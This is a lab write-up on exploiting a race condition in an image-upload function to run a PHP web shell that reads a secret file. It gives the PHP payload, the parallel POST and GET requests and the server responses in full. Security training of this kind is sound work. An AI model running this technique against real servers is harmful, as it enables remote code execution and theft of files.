# Web shell upload via race condition

This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

## 1. Detection

- Opened the Lab URL and clicked on <a href="/my-account?id=wiener">My Account</a> and logged in with given credentials `wiener:peter`.
- The page had option to upload an avatar.
- I uploaded a normal PNG image file and captured the request in <a href="https://portswigger.net/burp/downloads">BurpSuite</a>.
- A `POST /my-account/avatar` was being sent, I right clicked on the request and sent it to `Repeater` tab to start playing with it.
- The file was uploaded successfully.

---

## 2. Probing the Validation

- I started tampering with the request to understand what the server was actually validating.
- First, I changed the `Content-Type` header of the file part to `text/html` and re-uploaded the same image — it was accepted and still rendered as an image.
- Then I changed the filename from `taken.png` to `taken.html`, kept `Content-Type: text/html`, and kept the file content as-is (raw PNG bytes). The upload succeeded, but when I opened the file link in a new tab, instead of rendering an image, I saw the raw binary content of the PNG:

```
‰PNG  IHDR€°0WöÿºIDATx^ìÝ€åý>ðg{¹^©w½‹DöÞ»ÑØ¢Q"˜˜D%ÍD"_ò71¦ª)vÆÞA@¥H¤ÃQŽëe{ûÏ÷Ùc9®ì^¿ãùèÜôÙÙ¹Ý½eŸý¾¯©¨¸$ê5>¯Ç˜...
```

- This told me the server was not enforcing the extension or `Content-Type` for validation.
- Next, I stripped the magic bytes (`‰PNG`) from the file and re-uploaded it with no other changes — the server **rejected** it.
- This confirmed: **the server is only checking magic bytes**, not the file extension or `Content-Type` header.

---

## 3. Exploiting the Race Condition to Solve the Challenge

- The server only checks the upload's magic bytes, but that check isn't instant: the file is written to disk first, then validated, then deleted if it fails. That gap between write and cleanup is the race window. If I can request the freshly-written file before the server deletes it, it'll still get executed by the PHP interpreter even though the upload itself is ultimately rejected.
- I crafted a PHP payload to read the secret file, prefixed with `PNG` so it'd at least pass the initial magic-byte sniff:

```http
------WebKitFormBoundaryagRGgICIBZN3mSqr
Content-Disposition: form-data; name="avatar"; filename="valid.php"
Content-Type: text/html

PNG

<?php
	echo file_get_contents('/home/carlos/secret');
?>
------WebKitFormBoundaryagRGgICIBZN3mSqr
```

- I exploited the race condition using **two requests**, sent in parallel:

**Request 1 — upload the PHP web shell:**
```http
POST /my-account/avatar HTTP/2
Host: 0ac6008c045b0443803f35e300f00047.web-security-academy.net
Cookie: session=umpdAKjodHk3AAYqyqhTEbberfZ7bb78
Content-Length: 477
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryagRGgICIBZN3mSqr
...
------WebKitFormBoundaryagRGgICIBZN3mSqr
Content-Disposition: form-data; name="avatar"; filename="valid.php"
Content-Type: text/html

PNG

<?php
	echo file_get_contents('/home/carlos/secret');
?>
------WebKitFormBoundaryagRGgICIBZN3mSqr
```

**Request 2 — immediately request the uploaded file before it gets cleaned up:**
```http
GET /files/avatars/valid.php HTTP/2
Host: 0ac6008c045b0443803f35e300f00047.web-security-academy.net
Cookie: session=umpdAKjodHk3AAYqyqhTEbberfZ7bb78
...
```

- I added both requests to a **group in Burp Repeater** and used **"Send group in parallel"** to fire them at (effectively) the same time, racing the upload against the read.
- The `POST` (request 1) consistently came back **403 Forbidden** — the server's validation correctly flagged `valid.php` as not a real image and rejected it, since the content didn't actually start with valid PNG magic bytes:

```http
HTTP/2 403 Forbidden
Date: Sat, 20 Jun 2026 05:24:23 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 171

Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- So the payload was never directly "accepted" by the validator — it's correctly identified as not a real image and rejected. But the key is **timing**: the server writes the uploaded file to disk *before* it finishes validating it, and only deletes it *after* the check fails. That gap is the race window. If the `GET` request (request 2) hits `/files/avatars/valid.php` while the file is still sitting on disk in that gap, the PHP executes anyway — regardless of the 403 the upload itself eventually returns.
- Most attempts landed outside that window and the `GET` just returned a 404, since the file had already been validated and removed (or hadn't been written yet) by the time the request hit:

```http
HTTP/2 404 Not Found
Date: Sat, 20 Jun 2026 05:24:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
X-Frame-Options: SAMEORIGIN
Content-Length: 274

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 507b73a924f4 Port 80</address>
</body></html>
```

- After **5–6 tries** of re-sending the grouped requests in parallel, one attempt finally landed inside the race window — the `GET` hit the file while it still briefly existed on disk, before the validation cleanup deleted it, so the PHP executed and returned the secret even though the upload itself had been rejected:

```http
HTTP/2 200 OK
Date: Sat, 20 Jun 2026 05:24:23 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 46

PNG

VxtYzqCDz4akNWTHokZAoJFzwr4p4SIM
```

- Submitted `VxtYzqCDz4akNWTHokZAoJFzwr4p4SIM` as the flag and solved the lab.